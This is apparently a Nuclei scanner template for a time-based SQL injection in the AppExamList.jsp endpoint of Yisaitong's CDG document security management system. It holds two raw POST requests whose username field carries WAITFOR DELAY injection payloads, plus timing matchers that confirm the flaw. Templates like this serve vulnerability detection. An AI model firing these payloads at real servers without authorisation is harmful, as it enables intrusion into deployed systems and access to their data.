id: Yisaitong-CDG-AppExamList-SQL-time-based

info:
  name: "亿赛通电子文档安全管理系统 AppExamList.jsp 时间盲注 SQL 注入"
  author: HuanXiong
  severity: high
  description: Time-based SQL injection in AppExamList.jsp endpoint.
  tags: 亿赛通电子文档安全管理系统
  metadata:
    verified: true
    max-request: 2

http:
  - raw:
      # -------------------------
      # 1️⃣ 5秒延时
      # -------------------------
      - |
        @timeout: 30s
        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        username=1' WAITFOR DELAY '0:0:5'--

      # -------------------------
      # 2️⃣ 8秒延时
      # -------------------------
      - |
        @timeout: 30s
        POST /CDGServer3/client/AppExamList.jsp;Servicelogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Connection: close

        username=1' WAITFOR DELAY '0:0:8'--

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200"
          - "status_code_2 == 200"
          - "duration_1 >= 5 && duration_1 <= 7"
          - "duration_2 >= 8 && duration_2 <= 10"
          - "duration_2 - duration_1 >= 2"
        condition: and